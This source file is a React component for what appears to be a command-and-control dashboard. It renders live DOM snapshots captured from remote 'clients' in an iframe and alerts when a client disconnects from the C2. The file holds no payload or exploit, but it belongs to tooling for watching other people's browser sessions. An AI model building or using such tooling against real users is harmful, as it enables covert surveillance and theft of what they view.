import { useEffect, useRef, useMemo } from "react";
import { toast } from "sonner";
import { Loader2, WifiOff } from "lucide-react";
import { useWebSocket } from "@/hooks/use-websocket";
import { useDomViewer } from "@/hooks/use-dom-viewer";
import { usePolling } from "@/hooks/use-polling";
import { Card, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { cn, buildViewerWsUrl } from "@/lib/utils";
import type { Client } from "@/types/api";

interface DomViewerPanelProps {
  clientId: string;
  /** Applied to the iframe element. Defaults to a sensible min-height. */
  className?: string;
  /** Called when WS status changes */
  onStatusChange?: (status: "connecting" | "open" | "closed") => void;
  /** Called whenever the captured page's baseUrl changes (e.g. on navigation) */
  onUrlChange?: (url: string | null) => void;
}

/**
 * Renders the live DOM captured from a client by applying incoming
 * JSON deltas/snapshots to a local node map and writing the rendered
 * HTML into a sandboxed iframe.
 *
 * Shows a loading spinner before the first DOM snapshot arrives, and a styled
 * "Client offline" card when the client is not connected and no DOM has been
 * captured yet. Fires a toast notification when the client disconnects.
 */
export function DomViewerPanel({
  clientId,
  className,
  onStatusChange,
  onUrlChange,
}: DomViewerPanelProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const wsUrl = useMemo(() => buildViewerWsUrl(clientId, "domviewer"), [clientId]);

  const { html, baseUrl, hasData, clientConnected, onMessage } = useDomViewer();
  const { status } = useWebSocket(wsUrl, { onMessage });

  // Poll for client online/offline state to detect pre-existing offline condition
  const { data: client } = usePolling<Client>(`/api/clients/${clientId}`, 10000);

  useEffect(() => {
    onStatusChange?.(status);
  }, [status, onStatusChange]);

  useEffect(() => {
    onUrlChange?.(baseUrl);
  }, [baseUrl, onUrlChange]);

  // Toast when the client disconnects while we're viewing
  useEffect(() => {
    if (!clientConnected) {
      toast("Client disconnected from C2");
    }
  }, [clientConnected]);

  useEffect(() => {
    if (!html || !iframeRef.current) return;
    const doc = iframeRef.current.contentDocument;
    if (!doc) return;
    doc.open();
    doc.write(html);
    doc.close();
  }, [html]);

  // The client is considered offline if: polled client.connected is false OR
  // we received a "disconnected" WS message (clientConnected=false). We only
  // show the offline card when no DOM has been received yet (hasData=false),
  // so existing captured DOM stays visible after a disconnect.
  const isClientOffline = !clientConnected || client?.connected === false;
  const showOfflineCard = isClientOffline && !hasData;
  const showSpinner = !hasData && !showOfflineCard && status === "open";

  if (showOfflineCard) {
    return (
      <div
        className={cn(
          "flex items-center justify-center",
          className
        )}
        style={className ? undefined : { height: "calc(100vh - 180px)", minHeight: "400px" }}
      >
        <Card className="w-80 text-center">
          <CardHeader className="items-center gap-2">
            <WifiOff className="h-8 w-8 text-muted-foreground" />
            <CardTitle>Client offline</CardTitle>
            <CardDescription>
              This client is not connected. The DOM will appear here when the client reconnects.
            </CardDescription>
          </CardHeader>
        </Card>
      </div>
    );
  }

  return (
    <div
      className={cn("relative", className)}
      style={className ? undefined : { height: "calc(100vh - 180px)", minHeight: "400px" }}
    >
      {showSpinner && (
        <div className="absolute inset-0 flex items-center justify-center bg-background/60 z-10 pointer-events-none">
          <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
        </div>
      )}
      <iframe
        ref={iframeRef}
        sandbox="allow-same-origin"
        className={cn(
          "w-full h-full border border-border rounded-md bg-white",
          className && "border-none rounded-none"
        )}
      />
    </div>
  );
}
